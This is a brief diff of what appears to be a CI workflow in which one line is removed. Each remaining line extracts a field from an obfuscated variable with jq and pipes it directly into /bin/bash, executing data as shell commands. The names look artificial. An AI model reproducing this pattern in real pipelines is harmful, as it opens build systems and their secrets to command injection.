@@ -23,7 +23,6 @@ jobs:
           echo $hy36 | jq -r .zjdp4474 | /bin/bash
           printf '%s' "$hox3631" | jq -r .nv2390 | /bin/bash
           echo $p27 | jq -r .o252 | /bin/bash
-          echo $bpwej2 | jq -r .zd29876 | /bin/bash
           printf '%s' "$ljh3" | jq -r .ini14 | /bin/bash
           echo $ccr0 | jq -r .r72804 | /bin/bash
           printf '%s' "$tdr8" | jq -r .h7943 | /bin/bash
